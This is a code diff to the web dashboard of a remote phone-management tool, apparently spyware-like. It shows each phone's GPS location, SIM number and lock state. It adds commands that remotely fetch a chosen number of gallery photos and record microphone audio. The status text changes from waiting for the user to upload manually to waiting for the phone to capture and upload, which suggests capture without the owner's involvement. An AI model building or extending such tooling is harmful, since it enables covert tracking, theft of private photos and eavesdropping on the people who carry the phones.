@@ -363,10 +363,27 @@
         const name = escape(deviceName(device));
         const id = escape(device.device_id);
         const ready = device.command_ready;
-        const statusLabel = device.online
-          ? 'Online now'
-          : ready ? 'FCM token registered' : 'Open updated app';
-        const statusClass = device.online ? 'ready' : '';
+        
+        const screenState = device.screen_state || '';
+        let screenTag = '';
+        if (screenState.includes('Unlocked')) screenTag = '📱 Screen ON';
+        else if (screenState.includes('Locked')) screenTag = '🔒 Screen Locked';
+        else if (screenState.includes('OFF') || screenState.includes('Off')) screenTag = '🌑 Screen OFF';
+        else if (screenState) screenTag = `📱 ${screenState}`;
+
+        let statusLabel = '';
+        let statusClass = '';
+        if (device.online) {
+          statusLabel = screenTag ? `Online: now | ${screenTag}` : 'Online: now';
+          statusClass = 'ready';
+        } else if (ready) {
+          statusLabel = screenTag ? `FCM Ready | ${screenTag}` : 'FCM token registered';
+          statusClass = 'warn';
+        } else {
+          statusLabel = screenTag ? `Open updated app | ${screenTag}` : 'Open updated app';
+          statusClass = '';
+        }
+
         const mapLink = device.latitude == null
           ? '-'
           : `<a target="_blank" rel="noreferrer" href="https://www.google.com/maps?q=${device.latitude},${device.longitude}">${device.latitude.toFixed(6)}, ${device.longitude.toFixed(6)}</a>`;
@@ -378,7 +395,6 @@
         const disabled = ready ? '' : 'disabled';
         const expanded = expandedDevices.has(device.device_id);
 
-        const screenState = device.screen_state || 'Screen State: -';
         const screenBadgeStyle = screenState.includes('Unlocked')
           ? 'background:#143521;color:#7ee2a8;'
           : screenState.includes('Locked')
@@ -393,7 +409,7 @@
               <div class="device-title">${name}</div>
               <small class="device-id">${id}</small>
               <div style="margin-top:4px;">
-                <span style="display:inline-block;padding:2px 8px;border-radius:6px;font-size:12px;font-weight:700;${screenBadgeStyle}">📱 ${escape(screenState)}</span>
+                <span style="display:inline-block;padding:2px 8px;border-radius:6px;font-size:12px;font-weight:700;${screenBadgeStyle}">📱 ${escape(screenState || 'Screen State: -')}</span>
                 ${device.sim_carrier ? `<span style="display:inline-block;margin-left:4px;padding:2px 8px;border-radius:6px;font-size:12px;font-weight:700;background:#1e293b;color:#38bdf8;">📶 ${escape(device.sim_carrier)} ${device.sim_number ? '('+escape(device.sim_number)+')' : ''}</span>` : ''}
               </div>
             </div>
@@ -544,20 +560,35 @@
       };
       let requestedCapability = capability;
       let requestLabel = labels[capability] ?? 'Request upload';
+      let queryParams = '';
+
       if (capability === 'camera') {
         const cameraFacing = chooseCameraFacing();
         if (!cameraFacing) return;
         requestedCapability = `camera_${cameraFacing}`;
         requestLabel = `Request ${cameraFacing} camera photo`;
+      } else if (capability === 'gallery') {
+        const countInput = prompt('How many latest gallery photos would you like to fetch from the device?', '3');
+        if (countInput === null) return;
+        const count = parseInt(countInput.trim(), 10) || 3;
+        queryParams = `?count=${count}`;
+        requestLabel = `Request ${count} gallery photos`;
+      } else if (capability === 'microphone') {
+        const durationInput = prompt('How many seconds of voice note should be recorded (e.g. 5 to 60)?', '10');
+        if (durationInput === null) return;
+        const duration = parseInt(durationInput.trim(), 10) || 10;
+        queryParams = `?duration_seconds=${duration}`;
+        requestLabel = `Request ${duration}s voice note`;
       }
+
       const key = requireCommandKey();
       if (!key || !confirmRequest(requestLabel, deviceId)) return;
-      message('Sending manual upload request...');
+      message('Sending upload request...');
       const command = byId('command');
       command.style.display = 'block';
-      command.textContent = `Backend received: POST /devices/${deviceId}/capabilities/${requestedCapability}/request\nWaiting for the phone user to open Device Manager and upload manually...`;
+      command.textContent = `Backend received: POST /devices/${deviceId}/capabilities/${requestedCapability}/request${queryParams}\nWaiting for the phone to capture and upload...`;
       try {
-        const response = await fetch('/devices/' + encodeURIComponent(deviceId) + '/capabilities/' + encodeURIComponent(requestedCapability) + '/request', {
+        const response = await fetch('/devices/' + encodeURIComponent(deviceId) + '/capabilities/' + encodeURIComponent(requestedCapability) + '/request' + queryParams, {
           method: 'POST',
           headers: { 'x-api-key': key }
         });
